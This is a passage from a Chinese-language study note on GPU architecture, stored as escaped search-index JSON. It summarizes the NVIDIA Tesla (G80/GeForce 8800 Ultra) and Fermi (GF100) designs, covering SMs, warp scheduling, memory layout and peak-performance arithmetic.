\u200b\u7684\u200b\u5185\u90e8\u200b\u67b6\u6784\u200b\u3002</p> <p> </p> Tesla TPC \u200b\u67b6\u6784\u200b\uff08\u200b\u6765\u6e90\u200b\uff1aNVIDIA Tesla: A Unified Graphics and Computing Architecture Figure 2\uff09 <p>\u200b\u6bcf\u4e2a\u200b TPC \u200b\u5305\u62ec\u200b\u4e00\u4e2a\u200b Geometry controller \u200b\u548c\u200b\u4e00\u4e2a\u200b SM Controller (SMC)\uff0c\u200b\u4e0b\u9762\u200b\u662f\u200b\u4e24\u4e2a\u200b SM\uff0c\u200b\u6700\u540e\u200b\u662f\u200b Texture unit \u200b\u548c\u200b\u5b83\u200b\u5185\u90e8\u200b\u7684\u200b Texture L1\u3002\u200b\u6bcf\u4e2a\u200b SM \u200b\u6709\u200b 8 \u200b\u4e2a\u200b SP\u3002Geometry controller \u200b\u662f\u200b\u7528\u4e8e\u200b\u914d\u5408\u200b vertex shader \u200b\u548c\u200b geometry shader \u200b\u7684\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u5c31\u200b\u4e0d\u200b\u6df1\u5165\u5206\u6790\u200b\u4e86\u200b\u3002\u200b\u4e0b\u9762\u200b\u4e3b\u8981\u200b\u5206\u6790\u200b SM\u3002</p> <p>SM \u200b\u662f\u200b\u6267\u884c\u200b\u8ba1\u7b97\u200b\u7684\u200b\u4e3b\u8981\u200b\u90e8\u4ef6\u200b\uff0c\u200b\u5185\u90e8\u200b\u6709\u200b 8 \u200b\u4e2a\u200b SP\uff0c\u200b\u4e24\u4e2a\u200b Special Function Unit\uff08SFU\uff0c\u200b\u7528\u4e8e\u200b\u8ba1\u7b97\u200b\u4e09\u89d2\u51fd\u6570\u200b\u7b49\u200b\u7279\u6b8a\u200b\u6570\u5b66\u200b\u51fd\u6570\u200b\u4ee5\u53ca\u200b\u63d2\u503c\u200b\uff09\uff0c\u200b\u4e00\u4e2a\u200b\u591a\u7ebf\u7a0b\u200b\u7684\u200b\u53d6\u6307\u4ee4\u200b\u548c\u200b Issue \u200b\u5355\u5143\u200b\uff08MT Issue\uff09\uff0c\u200b\u4e00\u4e2a\u200b\u6307\u4ee4\u200b\u7f13\u5b58\u200b\uff08I Cache\uff09\uff0c\u200b\u4e00\u4e2a\u200b\u5e38\u91cf\u200b\u7f13\u5b58\u200b\uff08C Cache\uff09\u200b\u548c\u200b 16 KB \u200b\u7684\u200b\u5171\u4eab\u5185\u5b58\u200b\uff08Shared memory\uff09\u3002\u200b\u6ce8\u610f\u200b SM \u200b\u5185\u90e8\u200b\u6ca1\u6709\u200b\u6570\u636e\u200b\u7f13\u5b58\u200b\u3002\u200b\u6bcf\u4e2a\u200b SP \u200b\u5305\u62ec\u200b\u4e00\u4e2a\u200b\u6d6e\u70b9\u200b\u4e58\u52a0\u200b\u5355\u5143\u200b\uff08MAD\uff0cMultiply Add\uff0c\u200b\u6ca1\u6709\u200b\u4e58\u52a0\u200b\u878d\u5408\u200b\uff09\uff0c\u200b\u6bcf\u4e2a\u200b SFU \u200b\u5305\u62ec\u200b\u56db\u4e2a\u200b\u6d6e\u70b9\u200b\u4e58\u6cd5\u5668\u200b\u3002SP \u200b\u5de5\u4f5c\u200b\u5728\u200b 1.5 GHz \u200b\u7684\u200b\u9891\u7387\u200b\u4e0b\u200b\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u7684\u200b\u5355\u7cbe\u5ea6\u200b\u6d6e\u70b9\u200b\u5cf0\u503c\u200b\u6027\u80fd\u200b\u662f\u200b 36 GFLOPS\u3002\u200b\u8fd9\u4e2a\u200b 36 GFLOPS \u200b\u5305\u62ec\u200b\u4e86\u200b SP \u200b\u5185\u200b\u7684\u200b MAD \u200b\u5355\u5143\u200b\u7684\u200b \\(8 * 2 * 1.5 = 24\\) GFLOPS \u200b\u4ee5\u53ca\u200b SFU \u200b\u5185\u200b\u7684\u200b\u6d6e\u70b9\u200b\u52a0\u6cd5\u200b\u5355\u5143\u200b\u7684\u200b \\(2 * 4 * 1.5 = 12\\) GFLOPS\u3002\uff08<code>The GeForce 8800 Ultra clocks the SPs and SFU units at 1.5 GHz, for a peak of 36 Gflops per SM. To optimize power and area efficiency, some SM non-data-path units operate at half the SP clock rate.</code>\uff09</p> <p>SM \u200b\u4ee5\u200b warp \u200b\u4e3a\u200b\u5355\u4f4d\u200b\u6765\u200b\u5e76\u884c\u6267\u884c\u200b\u591a\u4e2a\u200b\u7ebf\u7a0b\u200b\uff0c\u200b\u4e00\u4e2a\u200b warp \u200b\u6709\u200b 32 \u200b\u4e2a\u200b\u7ebf\u7a0b\u200b\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u6267\u884c\u200b 768 \u200b\u4e2a\u200b\u7ebf\u7a0b\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b 24 \u200b\u4e2a\u200b warp\u3002SM \u200b\u5728\u200b\u6267\u884c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u9009\u62e9\u200b\u4e00\u4e2a\u200b\u51c6\u5907\u200b\u597d\u200b\u6267\u884c\u200b\u4e0b\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u7684\u200b warp \u200b\u53bb\u200b\u53d1\u5c04\u200b\u6307\u4ee4\u200b\u3002\u200b\u5f53\u200b warp \u200b\u5206\u53c9\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5148\u200b\u5b8c\u6210\u200b\u5206\u652f\u200b\u4e00\u4e2a\u200b\u65b9\u5411\u200b\u7684\u200b\u6267\u884c\u200b\uff0c\u200b\u518d\u200b\u5b8c\u6210\u200b\u5206\u652f\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u65b9\u5411\u200b\uff0c\u200b\u76f4\u5230\u200b\u4e24\u8fb9\u200b\u91cd\u65b0\u200b\u6c47\u805a\u200b\u5230\u200b\u540c\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\uff0c\u200b\u6b64\u65f6\u200b\u6574\u4e2a\u200b warp \u200b\u53c8\u200b\u53ef\u4ee5\u200b\u7ee7\u7eed\u200b\u540c\u65f6\u200b\u6267\u884c\u200b\u3002</p> <p>\u200b\u8d1f\u8d23\u200b warp \u200b\u8c03\u5ea6\u200b\u7684\u200b\u5c31\u662f\u200b SM warp scheduler\u3002\u200b\u5b83\u200b\u8fd0\u884c\u200b\u5728\u200b 1.5GHz \u200b\u7684\u200b\u4e00\u534a\u200b\u9891\u7387\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b 750MHz\u3002\u200b\u5b83\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u4f1a\u200b\u4ece\u200b 24 \u200b\u4e2a\u200b warp \u200b\u4e2d\u200b\u9009\u62e9\u200b\u4e00\u4e2a\u200b\u53bb\u200b\u8c03\u5ea6\u200b\uff08<code>The SM warp scheduler operates at half the 1.5-GHz processor clock rate. At each cycle, it selects one of the 24 warps to execute a SIMT warp instruction</code>\uff09\uff0c\u200b\u88ab\u200b\u8c03\u5ea6\u200b\u7684\u200b warp \u200b\u7684\u200b 32 \u200b\u4e2a\u200b\u7ebf\u7a0b\u200b\u4f1a\u200b\u88ab\u200b\u62c6\u6210\u200b\u4e24\u7ec4\u200b\uff0c\u200b\u6bcf\u7ec4\u200b 16 \u200b\u4e2a\u200b\u7ebf\u7a0b\u200b\uff0c\u200b\u7136\u540e\u200b\u7528\u200b\u56db\u4e2a\u200b 1.5GHz \u200b\u9891\u7387\u200b\u7684\u200b\u5468\u671f\u200b\u53bb\u200b\u6267\u884c\u200b\uff1a\u200b\u56e0\u4e3a\u200b SP \u200b\u53ea\u6709\u200b 8 \u200b\u4e2a\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u6700\u200b\u591a\u200b\u8fdb\u884c\u200b 8 \u200b\u4e2a\u200b\u7ebf\u7a0b\u200b\u7684\u200b\u6267\u884c\u200b\uff0c32 \u200b\u4e2a\u200b\u7ebf\u7a0b\u200b\u7684\u8bdd\u200b\u5c31\u200b\u9700\u8981\u200b 4 \u200b\u4e2a\u200b\u5468\u671f\u200b\uff08<code>An issued warp instruction executes as two sets of 16 threads over four processor cycles.</code>\uff09\u3002\u200b\u5728\u200b\u5b9e\u73b0\u200b warp \u200b\u8c03\u5ea6\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cwarp scheduler \u200b\u91c7\u7528\u200b\u4e86\u200b scoreboard \u200b\u673a\u5236\u200b\uff0c\u200b\u8ddf\u8e2a\u200b\u54ea\u4e9b\u200b warp \u200b\u53ef\u4ee5\u200b\u88ab\u200b issue\u3002\u200b\u8c03\u5ea6\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5728\u200b\u53ef\u4ee5\u200b\u88ab\u200b issue \u200b\u7684\u200b warp \u200b\u91cc\u9762\u200b\uff0c\u200b\u6839\u636e\u200b\u4f18\u5148\u7ea7\u200b\u3001\u200b\u6307\u4ee4\u200b\u7c7b\u578b\u200b\u548c\u200b\u516c\u5e73\u6027\u200b\u7b49\u200b\u539f\u5219\u200b\u53bb\u200b\u8c03\u5ea6\u200b warp\u3002</p> <p>\u200b\u6bcf\u4e2a\u200b SP \u200b\u4e0a\u200b\u6267\u884c\u200b\u7684\u200b\u6307\u4ee4\u200b\u652f\u6301\u200b\uff1a\u200b\u6d6e\u70b9\u200b\uff0c\u200b\u6574\u6570\u200b\uff0c\u200b\u4f4d\u200b\u8fd0\u7b97\u200b\uff0c\u200b\u7c7b\u578b\u8f6c\u6362\u200b\uff0c\u200b\u7279\u6b8a\u200b\u51fd\u6570\u200b\uff0c\u200b\u63a7\u5236\u6d41\u200b\uff0c\u200b\u5185\u5b58\u200b\u8bfb\u5199\u200b\u548c\u200b Texture\u3002\u200b\u73b0\u5728\u200b\u627e\u200b\u4e0d\u5230\u200b Tesla \u200b\u67b6\u6784\u200b\u7684\u200b\u6307\u4ee4\u96c6\u200b\u5217\u8868\u200b\uff0c\u200b\u4f46\u662f\u200b\u5728\u200b Fermi Instruction Set \u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b Tesla \u200b\u7684\u200b\u4e0b\u4e00\u4ee3\u200b\u67b6\u6784\u200b Fermi \u200b\u7684\u200b\u6307\u4ee4\u96c6\u200b\u5217\u8868\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u63d0\u5347\u200b\u5185\u5b58\u200b\u8bbf\u95ee\u200b\u5e26\u5bbd\u200b\uff0cSM \u200b\u4f1a\u200b\u5bf9\u200b\u540c\u4e00\u4e2a\u200b warp \u200b\u5bf9\u200b local \u200b\u6216\u8005\u200b global memory \u200b\u7684\u200b\u8bbf\u95ee\u200b\u8fdb\u884c\u200b\u5408\u5e76\u200b\uff0c\u200b\u628a\u200b\u8fde\u7eed\u200b\u7684\u200b\u8bbf\u95ee\u200b\u5408\u5e76\u200b\u6210\u200b\u4e00\u4e2a\u200b\u5927\u200b\u7684\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u4ece\u800c\u200b\u63d0\u5347\u200b\u6027\u80fd\u200b\u3002Tesla \u200b\u67b6\u6784\u200b\u8fd8\u200b\u5f15\u5165\u200b\u4e86\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\uff0c\u200b\u5305\u62ec\u200b\u6574\u6570\u200b\u52a0\u6cd5\u200b\u3001\u200b\u6574\u6570\u200b\u6700\u5c0f\u200b\u6700\u5927\u503c\u200b\u3001\u200b\u903b\u8f91\u8fd0\u7b97\u200b\u3001swap \u200b\u548c\u200b Compare-And-Swap\uff08CAS\uff09\u3002\u200b\u5173\u4e8e\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\u7684\u200b\u90e8\u5206\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u9605\u8bfb\u200b \u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b \u200b\u7684\u200b\u4ecb\u7ecd\u200b\u3002</p> <p>\u200b\u5185\u5b58\u200b\u90e8\u5206\u200b\uff0cTesla \u200b\u67b6\u6784\u200b\u7684\u200b DRAM \u200b\u5bbd\u5ea6\u200b\u662f\u200b 384 \u200b\u4f4d\u200b\uff0c\u200b\u5206\u4e3a\u200b 6 \u200b\u7ec4\u200b\uff0c\u200b\u6bcf\u7ec4\u200b 64 \u200b\u4f4d\u200b\uff0c\u200b\u4e5f\u200b\u5bf9\u5e94\u200b\u4e86\u200b\u516d\u5206\u4e4b\u4e00\u200b\u7684\u200b\u663e\u5b58\u200b\u5bb9\u91cf\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u7269\u7406\u5730\u5740\u200b\u7a7a\u95f4\u200b\u3002Tesla \u200b\u67b6\u6784\u200b\u5df2\u7ecf\u200b\u5f15\u5165\u200b\u4e86\u200b\u865a\u62df\u5185\u5b58\u200b\uff0c\u200b\u6240\u6709\u200b\u6307\u4ee4\u200b\u6d89\u53ca\u200b\u5230\u200b\u7684\u200b\u5730\u5740\u200b\u90fd\u200b\u662f\u200b\u865a\u62df\u5730\u5740\u200b\u3002\u200b\u9875\u8868\u200b\u4fdd\u5b58\u200b\u5728\u200b local memory \u200b\u91cc\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e5f\u200b\u6709\u200b\u76f8\u5e94\u200b\u7684\u200b TLB \u200b\u5c42\u6b21\u200b\u6765\u200b\u51cf\u5c11\u200b page table walk \u200b\u7684\u200b\u6b21\u6570\u200b\u3002Tesla \u200b\u67b6\u6784\u200b\u6ca1\u6709\u200b\u6570\u636e\u200b\u7f13\u5b58\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u6309\u7167\u200b\u4f20\u7edf\u200b\u7684\u200b\u56fe\u5f62\u200b\u6d41\u7a0b\u200b\uff0c\u200b\u4e00\u822c\u200b\u662f\u4ece\u200b\u5185\u5b58\u200b\u4e2d\u200b\u8bfb\u53d6\u200b\u7eb9\u7406\u200b\uff0c\u200b\u8fdb\u884c\u200b\u4e00\u7cfb\u5217\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u7136\u540e\u200b\u5199\u5165\u200b\u7ed3\u679c\u200b\u5230\u200b\u5185\u5b58\u200b\u4e2d\u200b\u3002\u200b\u56e0\u6b64\u200b Tesla \u200b\u67b6\u6784\u200b\u53ea\u200b\u9488\u5bf9\u200b\u7eb9\u7406\u200b\u8bfb\u53d6\u200b\u8bbe\u7f6e\u200b\u4e86\u200b L1 \u200b\u548c\u200b L2 \u200b\u7f13\u5b58\u200b\u3002</p> <p>CUDA \u200b\u4e2d\u200b\uff0c\u200b\u6709\u200b thread block \u200b\u7684\u200b\u6982\u5ff5\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b cooperative thread array\uff08CTA\uff09\uff0ccooperative \u200b\u6307\u200b\u7684\u200b\u662f\u200b\u8fd9\u4e9b\u200b thread \u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b shared memory \u200b\u548c\u200b __syncthreads \u200b\u6765\u200b\u534f\u540c\u200b\u5b8c\u6210\u200b\u4e00\u4e9b\u200b\u8ba1\u7b97\u200b\u3002\u200b\u56e0\u4e3a\u200b\u5b83\u4eec\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b shared memory\uff0c\u200b\u81ea\u7136\u200b CTA \u200b\u4f1a\u200b\u88ab\u200b\u5f52\u200b\u5230\u200b\u67d0\u4e2a\u200b SM \u200b\u4e0b\u9762\u200b\uff0c\u200b\u800c\u200b\u4e0d\u4f1a\u200b\u8de8\u8d8a\u200b\u591a\u4e2a\u200b SM \u200b\u53bb\u200b\u6267\u884c\u200b\u3002\u200b\u6bcf\u4e2a\u200b SM \u200b\u53ef\u4ee5\u200b\u652f\u6301\u200b\u6700\u200b\u591a\u200b\u540c\u65f6\u200b\u6267\u884c\u200b 8 \u200b\u4e2a\u200b CTA\u3002</p> <p>CUDA \u200b\u4e2d\u7ebf\u200b\u7a0b\u200b\u4e00\u5171\u200b\u6709\u200b\u4e09\u4e2a\u200b\u5c42\u6b21\u200b\uff1a\u200b\u7b2c\u4e00\u4e2a\u200b\u662f\u200b Grid\uff0c\u200b\u7b2c\u4e8c\u4e2a\u200b\u662f\u200b Block\uff08Thread Block\uff0cCooperative Thread Array\uff09\uff0c\u200b\u7b2c\u4e09\u4e2a\u200b\u662f\u200b Thread\u3002Thread \u200b\u72ec\u4eab\u200b\u81ea\u5df1\u200b\u7684\u200b local memory\uff0cBlock \u200b\u5185\u200b\u7684\u200b\u6240\u6709\u200b Thread \u200b\u5171\u4eab\u200b Shared memory\uff0cGrid \u200b\u5185\u200b\u7684\u200b\u6240\u6709\u200b Thread \u200b\u5171\u4eab\u200b Global memory\u3002\u200b\u8fd9\u6837\u200b\u4e09\u4e2a\u200b\u7ebf\u7a0b\u200b\u5c42\u6b21\u200b\u5c31\u200b\u548c\u200b\u4e09\u79cd\u200b\u7c7b\u578b\u200b\u7684\u200b\u5185\u5b58\u200b\u5bf9\u5e94\u200b\u4e0a\u200b\u4e86\u200b\u3002Local memory \u200b\u867d\u7136\u200b\u662f\u200b\u7ebf\u7a0b\u200b\u5c40\u90e8\u200b\u7684\u200b\uff0c\u200b\u4f46\u200b\u5b9e\u9645\u4e0a\u200b\u4e5f\u200b\u662f\u200b\u4fdd\u5b58\u200b\u5728\u200b\u663e\u5b58\u200b\u4e2d\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u5176\u4ed6\u200b\u7ebf\u7a0b\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u7528\u6765\u200b\u4fdd\u5b58\u200b\u6808\u200b\u548c\u200b\u4e34\u65f6\u200b\u53d8\u91cf\u200b\u3002\u200b\u53ea\u6709\u200b Shared memory \u200b\u662f\u200b\u653e\u5728\u200b SM \u200b\u5185\u90e8\u200b\u7684\u200b\uff0c\u200b\u4f9b\u200b\u540c\u4e00\u4e2a\u200b CTA \u200b\u5185\u200b\u7684\u200b\u7ebf\u7a0b\u200b\u5171\u4eab\u200b\u3002</p> <p>\u200b\u6700\u540e\u200b\uff0c\u200b\u8bba\u6587\u200b\u603b\u7ed3\u200b\u4e86\u200b\u91c7\u7528\u200b Tesla \u200b\u67b6\u6784\u200b\u7684\u200b GeForce 8800 Ultra GPU \u200b\u7684\u200b\u53c2\u6570\u200b\uff1a</p> <ul> <li>681 million transistors, 470 mm^2;</li> <li>TSMC 90-nm CMOS;</li> <li>128 SP cores in 16 SMs; \u200b\u6bcf\u4e2a\u200b SM \u200b\u5185\u6709\u200b 8 \u200b\u4e2a\u200b SP\uff0c\u200b\u6240\u4ee5\u200b \\(8 * 16 = 128\\)</li> <li>12,288 processor threads; \u200b\u6bcf\u4e2a\u200b SM \u200b\u53ef\u4ee5\u200b\u8c03\u5ea6\u200b 24 \u200b\u4e2a\u200b warp\uff0c\u200b\u6240\u4ee5\u200b \\(16 * 24 * 32 = 12288\\)</li> <li>1.5-GHz processor clock rate;</li> <li>peak 576 Gflops in processors; \u200b\u6bcf\u4e2a\u200b SM \u200b\u662f\u200b 36 Gflops\uff0c\u200b\u6240\u4ee5\u200b \\(36 * 16 = 576\\)</li> <li>768-Mbyte GDDR3 DRAM; \u200b\u6bcf\u4e2a\u200b GDDR3 channel \u200b\u5185\u5b58\u200b\u6709\u200b 128MB\uff0c\u200b\u4e00\u5171\u200b 6 \u200b\u4e2a\u200b channel\uff0c\u200b\u6240\u4ee5\u200b \\(128 * 6 = 768\\)</li> <li>384-pin DRAM interface; \u200b\u6bcf\u4e2a\u200b GDDR3 channel \u200b\u662f\u200b 64 \u200b\u4f4d\u200b\uff0c\u200b\u6240\u4ee5\u200b \\(64 * 6 = 384\\)</li> <li>1.08-GHz DRAM clock;</li> <li>104-Gbyte/s peak bandwidth; \u200b\u6bcf\u4e2a\u200b GDDR3 channel \u200b\u662f\u200b 64 \u200b\u4f4d\u200b\uff0c\u200b\u6240\u4ee5\u200b \\(1.08 * 64 / 8 * 2 * 6 = 103.68\\)</li> <li>typical power of 150W at 1.3V.</li> </ul> <p>\u200b\u5728\u200b G80 \u200b\u4e4b\u540e\u200b\uff0c\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b Tesla \u200b\u67b6\u6784\u200b\u7684\u200b\u82af\u7247\u200b\uff1aGT200\uff0c\u200b\u91c7\u7528\u200b\u4e86\u200b Tesla 2.0 \u200b\u67b6\u6784\u200b\uff0c65nm \u200b\u5236\u7a0b\u200b\u5de5\u827a\u200b\u3002Tesla 2.0 \u200b\u76f8\u6bd4\u200b Tesla 1.0\uff0c\u200b\u5f15\u5165\u200b\u4e86\u200b\u53cc\u200b\u7cbe\u5ea6\u200b\u6d6e\u70b9\u200b\u8ba1\u7b97\u200b\u3002</p>"},{"location":"hardware/gpgpu.html#nvidia-fermi","title":"NVIDIA Fermi","text":"<p>\u200b\u8bba\u6587\u200b\uff1aC. M. Wittenbrink, E. Kilgariff and A. Prabhu, \"Fermi GF100 GPU Architecture,\" in IEEE Micro, vol. 31, no. 2, pp. 50-59, March-April 2011, doi: 10.1109/MM.2011.24.</p> <p>PPT: C.M. Wittenbrink, E. Kilgariff, and A. Prabhu, \u2018\u2018Fermi GF100: A Graphics Processing Unit (GPU) Architecture for Compute Tessellation, Physics, and Computational Graphics,\u2019\u2019 IEEE Hot Chips, presentation, 2010; https://old.hotchips.org/wp-content/uploads/hc_archives/hc22/HC22.23.110-1-Wittenbrink-Fermi-GF100.pdf.</p> <p>Whitepaper: Fermi: NVIDIA\u2019s Next Generation CUDA Compute Architecture</p> <p>Whitepaper: NVIDIA\u2019s Fermi: The First Complete GPU Computing Architecture</p> <p>Fermi \u200b\u662f\u200b Tesla \u200b\u7684\u200b\u4e0b\u4e00\u4ee3\u200b NVIDIA \u200b\u663e\u5361\u200b\u67b6\u6784\u200b\u3002Tesla \u200b\u867d\u7136\u200b\u652f\u6301\u200b\u4e86\u200b\u901a\u7528\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u4f46\u200b\u4f9d\u7136\u200b\u4fdd\u7559\u200b\u4e86\u200b\u5f88\u591a\u200b\u56fe\u5f62\u200b\u8ba1\u7b97\u200b\u7684\u200b\u9057\u7559\u200b\u8bbe\u8ba1\u200b\u3002\u200b\u76f8\u6bd4\u4e4b\u4e0b\u200b\uff0cFermi \u200b\u9488\u5bf9\u200b\u901a\u7528\u200b\u8ba1\u7b97\u200b\u505a\u51fa\u200b\u4e86\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u6539\u53d8\u200b\uff1a\u200b\u6570\u636e\u200b\u7f13\u5b58\u200b\u3001\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u8bbf\u5b58\u200b\u5355\u5143\u200b\u3001\u200b\u53cc\u200b\u7cbe\u5ea6\u200b\u6d6e\u70b9\u200b\u8ba1\u7b97\u200b\u3001ECC \u200b\u5185\u5b58\u200b\u4ee5\u53ca\u200b\u66f4\u5feb\u200b\u7684\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\u3002\u200b\u901a\u8fc7\u200b\u5f15\u5165\u200b Unified Address Space\uff0cFermi \u200b\u67b6\u6784\u200b\u80fd\u591f\u200b\u652f\u6301\u200b\u66f4\u200b\u591a\u200b\u4f7f\u7528\u200b\u6307\u9488\u200b\u7684\u200b C++ \u200b\u7a0b\u5e8f\u200b\u3002</p> <p>GF100 \u200b\u662f\u200b Fermi \u200b\u67b6\u6784\u200b\u7684\u200b\u4e00\u6b3e\u200b\u6838\u5fc3\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u914d\u7f6e\u200b\u5982\u4e0b\u200b\uff1a</p> <ul> <li>16 SM, 32 CUDA cores/SM, 512 CUDA cores in total</li> <li>3 billion transistors, 40nm TSMC process</li> <li>6Gbytes GDDR5 memory</li> <li>384-bit memory interface, 6 channels</li> <li>16 PolyMorph engines</li> <li>4 raster units</li> <li>64 texture units</li> <li>48 ROP(raster operation processor) units</li> </ul> <p>\u200b\u4ece\u200b\u5fae\u200b\u67b6\u6784\u200b\u65b9\u9762\u200b\uff0cFermi \u200b\u67b6\u6784\u200b\u628a\u200b Tesla \u200b\u67b6\u6784\u200b\u7684\u200b TPC \u200b\u6539\u540d\u200b\u4e3a\u200b Graphics Processor Clusters\uff08GPC\uff09\uff0c\u200b\u6bd5\u7adf\u200b Texture \u200b\u73b0\u5728\u200b\u663e\u5f97\u200b\u4e0d\u518d\u200b\u90a3\u4e48\u200b\u91cd\u8981\u200b\u3002GT100 \u200b\u6709\u200b 4 \u200b\u4e2a\u200b GPC\uff0c\u200b\u6bcf\u4e2a\u200b GPC \u200b\u6709\u200b 4 \u200b\u4e2a\u200b SM\uff0c\u200b\u6240\u4ee5\u200b\u4e00\u5171\u200b\u662f\u200b 16 \u200b\u4e2a\u200b SM\u3002SM \u200b\u4e2a\u6570\u200b\u76f8\u6bd4\u200b Tesla \u200b\u67b6\u6784\u200b\u6ca1\u6709\u200b\u53d8\u5316\u200b\uff0c\u200b\u4f46\u662f\u200b\u4ece\u200b 8 TPC \u200b\u4e58\u4ee5\u200b 2 SM/TPC \u200b\u53d8\u6210\u200b\u4e86\u200b 4 GPC \u200b\u4e58\u4ee5\u200b 4 SM/GPC\u3002\u200b\u5185\u5b58\u200b\u4f9d\u7136\u200b\u662f\u200b 6 \u200b\u901a\u9053\u200b\u3002\u200b\u65b0\u589e\u200b\u4e86\u200b\u4e00\u4e2a\u200b GigaThread engine\uff0c\u200b\u6bcf\u4e2a\u200b GPC \u200b\u5185\u6709\u200b\u4e00\u4e2a\u200b PolyMorph engine \u200b\u548c\u200b rasterizer\uff08Tesla \u200b\u67b6\u6784\u200b\u6574\u4e2a\u200b GPU \u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b rasterizer\uff09\u3002\u200b\u67b6\u6784\u56fe\u200b\u89c1\u200b\u4e0b\u200b\uff1a</p> <p> </p> Fermi \u200b\u67b6\u6784\u200b\u603b\u89c8\u200b\uff08\u200b\u6765\u6e90\u200b\uff1aFermi GF100 GPU Architecture Figure 2\uff09 <p>Fermi \u200b\u67b6\u6784\u200b\u5728\u200b SM \u200b\u5185\u90e8\u200b\u76f8\u6bd4\u200b Tesla \u200b\u53d8\u5316\u200b\u6bd4\u8f83\u200b\u5927\u200b\uff1aTesla \u200b\u6bcf\u4e2a\u200b SM \u200b\u53ea\u6709\u200b 8 \u200b\u4e2a\u200b SP\uff0c\u200b\u800c\u200b Fermi \u200b\u6bcf\u4e2a\u200b SM \u200b\u91cc\u9762\u200b\u6709\u200b 32 \u200b\u4e2a\u200b CUDA core\uff0cCUDA core \u200b\u7ea6\u7b49\u4e8e\u200b Tesla \u200b\u7684\u200b SP\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\u662f\u200b\u56db\u500d\u200b\u7684\u200b\u5173\u7cfb\u200b\u3002\u200b\u867d\u7136\u200b Fermi \u200b\u67b6\u6784\u200b\u7684\u200b SM \u200b\u6570\u91cf\u200b\u548c\u200b Tesla \u200b\u76f8\u540c\u200b\uff0c\u200b\u90fd\u200b\u662f\u200b 16\uff0c\u200b\u4f46\u662f\u200b\u4ece\u200b CUDA core \u200b\u7684\u200b\u6570\u91cf\u200b\u4e0a\u200b\u770b\u200b\uff0c\u200b\u4ece\u200b \\(16 * 8 = 128\\) \u200b\u63d0\u5347\u200b\u5230\u200b\u4e86\u200b \\(16 * 32 = 512\\) \u200b\u4e2a\u200b\u3002SFU \u200b\u5355\u5143\u200b\u4e5f\u200b\u4ece\u200b Tesla \u200b\u7684\u200b\u6bcf\u4e2a\u200b SM \u200b\u4e24\u4e2a\u200b\uff0c\u200b\u63d0\u5347\u200b\u5230\u200b\u4e86\u200b\u6bcf\u4e2a\u200b SM \u200b\u56db\u4e2a\u200b\u3002Fermi \u200b\u7684\u200b CUDA core \u200b\u5b9e\u73b0\u200b\u4e86\u200b\u6d6e\u70b9\u200b\u4e58\u52a0\u200b\u878d\u5408\u200b\uff08FMA\uff09\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u6bcf\u200b\u5468\u671f\u200b\u53ef\u4ee5\u200b\u8fdb\u884c\u200b 16 \u200b\u4e2a\u200b\u53cc\u200b\u7cbe\u5ea6\u200b\u6d6e\u70b9\u200b\u4e58\u52a0\u200b\u64cd\u4f5c\u200b\u3002Tesla \u200b\u7684\u200b\u6d6e\u70b9\u200b\u5e76\u200b\u6ca1\u6709\u200b\u5b8c\u5168\u200b\u6309\u7167\u200b IEEE754 \u200b\u6807\u51c6\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4e0d\u200b\u652f\u6301\u200b subnormal \u200b\u6d6e\u70b9\u200b\uff0c\u200b\u800c\u200b Fermi \u200b\u5b9e\u73b0\u200b\u4e86\u200b\u5b8c\u6574\u200b\u7684\u200b\u652f\u6301\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5b9e\u73b0\u200b\u4e86\u200b IEEE754 \u200b\u6807\u51c6\u200b\u7684\u200b rounding mode\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0cFermi \u200b\u67b6\u6784\u200b\u8fd8\u200b\u628a\u200b Load/Store\uff08LD/ST\uff09\u200b\u5355\u5143\u200b\u72ec\u7acb\u200b\u51fa\u6765\u200b\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u6709\u200b 16 \u200b\u4e2a\u200b LD/ST \u200b\u5355\u5143\u200b\uff0c\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b\u4e5f\u200b\u4ece\u200b 32 \u200b\u4f4d\u200b\u6269\u5927\u200b\u5230\u200b\u4e86\u200b 64 